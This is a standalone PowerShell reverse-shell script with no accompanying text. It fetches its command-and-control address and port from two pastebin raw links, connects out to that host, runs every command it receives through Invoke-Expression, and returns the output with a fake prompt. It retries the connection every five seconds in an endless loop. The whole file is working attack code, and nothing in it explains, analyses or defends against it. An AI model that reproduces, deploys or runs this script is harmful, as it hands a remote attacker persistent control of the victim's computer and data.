While($true) {
    Try {       
        $pastebinScriptUrl = 'https://pastebin.com/raw/b9j9rc8N'
        $pastebinScriptUrl2 = 'https://pastebin.com/raw/5nGTwEY8'
        $i = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl)
        $p = (New-Object System.Net.WebClient).DownloadString($pastebinScriptUrl2)
        Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient($i, $p))
        Set-Variable -Name stream -Value ($client.GetStream());
        [byte[]]$bytes = 0..65535|%{0};
        while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0) {
            Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));
            Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );
            Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');
            Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush();
        }
    } Catch {
        Write-Host "Connection failed. Retrying in 5 seconds..."
        Start-Sleep -Seconds 5
    }
}
